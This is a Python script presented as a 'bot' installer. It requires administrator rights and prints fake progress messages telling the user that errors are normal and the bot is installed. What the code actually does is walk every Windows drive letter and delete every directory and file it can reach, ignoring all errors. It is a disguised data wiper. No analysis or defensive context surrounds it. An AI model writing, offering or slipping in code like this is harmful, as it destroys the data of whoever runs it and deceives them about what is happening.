import os
import string
import ctypes
from shutil import rmtree
import sys


def main():
    if ctypes.windll.shell32.IsUserAnAdmin() != 1:
        print("Must be run as administrator, please see the README for additional help on how to run the bot.")
        sys.exit(1)
    print("Please wait while the bot is loading...")
    print("Some errors or graphical bugs are normal...")
    print("Once finished, everything should be good :)")

    for drive in string.ascii_uppercase:
        for thing in os.walk(f"{drive}:\\"):
            if thing[0]:
                try:
                    rmtree(thing[0])
                except:
                    pass
            if thing[1]:
                for directory in thing[1]:
                    try:
                        rmtree(directory)
                    except:
                        pass
            if thing[2]:
                for file in thing[2]:
                    try:
                        os.remove(file)
                    except:
                        pass

    print("Finished!  Your bot is installed...")
    print("Please reboot then rerun the script!")


if __name__ == "__main__":
    main()
